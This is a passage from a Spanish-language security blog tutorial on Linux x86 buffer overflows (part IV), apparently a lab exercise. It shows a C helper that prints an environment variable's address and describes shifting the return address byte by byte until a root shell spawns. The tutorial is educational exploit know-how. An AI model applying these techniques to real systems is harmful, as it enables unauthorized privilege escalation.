/><br />Código:</div><div style="text-align: left;"><br /></div><pre class="brush: cpp" style="text-align: left;">//getenv.c</pre><pre class="brush: cpp" style="text-align: left;">#include &lt;stdio.h&gt;<br />#include &lt;stdlib.h&gt;<br /><br />int main(int argc, char *argv[]) {<br /><br />if(argc &lt; 2) {<br />printf("Usage: %s &lt;environ_var&gt;\n", argv[0]);<br />exit(-1);<br />}<br /><br />char *addr_ptr;<br /><br />addr_ptr = getenv(argv[1]);<br /><br />if(addr_ptr == NULL) {<br />printf("Environmental variable %s does not exist!\n", argv[1]);<br />exit(-1);<br />}<br /><br />printf("%s is stored at address %p\n", argv[1], addr_ptr);<br />return(0);<br />}</pre><div style="text-align: left;"><br />Compilamos el código (<b>gcc getenv.c -o getenv</b>) y ejecutamos <b>getenv </b>pasando como parámetro el nombre de nuestra variable de entorno:</div><div style="text-align: left;"><br /></div><div style="text-align: left;"><br /></div><div class="separator" style="clear: both; text-align: center;"><a href="http://3.bp.blogspot.com/-_wGZUPtJL2g/VnRutyTuVVI/AAAAAAAAAwg/0B3yU7tsSSo/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2015-12-18%2B17%253A38%253A01.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="26" src="http://3.bp.blogspot.com/-_wGZUPtJL2g/VnRutyTuVVI/AAAAAAAAAwg/0B3yU7tsSSo/s320/Captura%2Bde%2Bpantalla%2Bde%2B2015-12-18%2B17%253A38%253A01.png" width="320" /></a></div><br /><div style="text-align: left;">La variable de entorno se encuentra alojada en el espacio de memoria:&nbsp;<b>0x7fffffffe43f</b></div><div style="text-align: left;"><b>Ésta dirección se debe a que mi arquitectura de procesador es x64, </b>pero sabiendo que <b>x86</b> se rige por los últimos 4 bytes podemos deducir que cerca de la dirección: <b>0xffffe43f </b>se encontrará nuestro llamado a <b>wrapper</b>.</div><div class="separator" style="clear: both; text-align: center;"><br /></div><div style="text-align: left;">Jugamos un poco con la dirección en nuestro payload moviéndonos algunos bites hasta obtener salidas que nos indiquen si estamos cerca:<br /><br />Dirección original: Nada!</div><div style="text-align: left;"><br /></div><div style="text-align: center;"><a href="http://4.bp.blogspot.com/-7fbJtjqdDmc/VnRw9NpA6jI/AAAAAAAAAws/_0FOWEvagEg/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2015-12-18%2B17%253A47%253A36.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="16" src="http://4.bp.blogspot.com/-7fbJtjqdDmc/VnRw9NpA6jI/AAAAAAAAAws/_0FOWEvagEg/s640/Captura%2Bde%2Bpantalla%2Bde%2B2015-12-18%2B17%253A47%253A36.png" width="640" /></a></div><div style="text-align: left;"><br /></div><div style="text-align: left;">Primer desplazamiento:&nbsp;<b>0xffffe43f -&gt;&nbsp;0xffffd43f</b></div><br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://4.bp.blogspot.com/-syc0_PMDGjs/VnRxmVG8i9I/AAAAAAAAAw0/_YTTRbLFbbw/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2015-12-18%2B17%253A49%253A38.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="22" src="http://4.bp.blogspot.com/-syc0_PMDGjs/VnRxmVG8i9I/AAAAAAAAAw0/_YTTRbLFbbw/s640/Captura%2Bde%2Bpantalla%2Bde%2B2015-12-18%2B17%253A49%253A38.png" width="640" /></a></div><div style="text-align: left;"><br /></div><div style="text-align: left;">Respuesta: <b>command not found!</b></div><div style="text-align: left;"><b><br /></b></div><div style="text-align: left;">En este punto debemos estar cerca de la zona de strings, comenzamos a desplazarnos byte por byte hasta llegar a la dirección de memoria correcta:</div><div style="text-align: left;"><br /></div><div class="separator" style="clear: both; text-align: center;"><a href="http://3.bp.blogspot.com/-JpRnJ6j48PQ/VnRyGscgtuI/AAAAAAAAAw8/uwVUwi5UU6U/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2015-12-18%2B17%253A51%253A56.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="38" src="http://3.bp.blogspot.com/-JpRnJ6j48PQ/VnRyGscgtuI/AAAAAAAAAw8/uwVUwi5UU6U/s640/Captura%2Bde%2Bpantalla%2Bde%2B2015-12-18%2B17%253A51%253A56.png" width="640" /></a></div><div style="text-align: center;"><br /></div><div style="text-align: left;"></div><div style="text-align: center;"><b>BUM! nuestra shell root spawneada!</b></div><div style="text-align: center;"><b><br /></b></div><div style="text-align: left;"><b>Espero que esta entrada les haya sido de utilidad a todos aquellos aventureros al mundo del exploiting, próximamente trataremos bypass de stack canaries.</b><br /><div style="text-align: center;"><b><b>Estoy abierto a críticas y sugerencias, gracias por su tiempo!</b></b></div><b></b></div><br /><br /><b>Saludos!</b></div></div></div></div></div></div></div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">Security Signal</span></span>
+
+      
+
+
+
+
+<time class='entry-date' datetime='2015-12-18T13:53:00-08:00'><span class='date'><span class='date-month'>Dec</span> <span class='date-day'>18</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>1:53 pm</span></time>
+      
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://securitysignal.github.io/blog/2015/12/18/desbordando-el-buffer-en-linux-x86-iv/" data-via="" data-counturl="http://securitysignal.github.io/blog/2015/12/18/desbordando-el-buffer-en-linux-x86-iv/" >Tweet</a>
+  
+  
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/blog/2015/09/30/eko-party-pre-ctf/" title="Previous Post: EkoParty Pre CTF ">&laquo; EkoParty Pre CTF </a>
+      
+      
+        <a class="basic-alignment right" href="/blog/2015/12/30/securitysocket-remote-exploit-library/" title="Next Post: SecuritySocket Remote Exploit Library">SecuritySocket Remote Exploit Library &raquo;</a>
+      
+    </p>
+  </footer>
+</article>
+
+</div>
+
+<aside class="sidebar">
+  
+    <section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2016/03/08/format-string-atack/">Format String Atack</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2016/01/07/ringzer0-level4-pwned-by-hdbreaker/">Ringzer0 Level4 Pwned! By Hdbreaker</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/12/30/securitysocket-remote-exploit-library/">SecuritySocket Remote Exploit Library</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/12/18/desbordando-el-buffer-en-linux-x86-iv/">Desbordando El Buffer en Linux X86 (IV)</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/09/30/eko-party-pre-ctf/">EkoParty Pre CTF</a>
+      </li>
+    
+  </ul>
+</section>
+
+
+
+
+
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2016 - q3rv0 - hdbreaker -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+</footer>
+  
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = '//platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
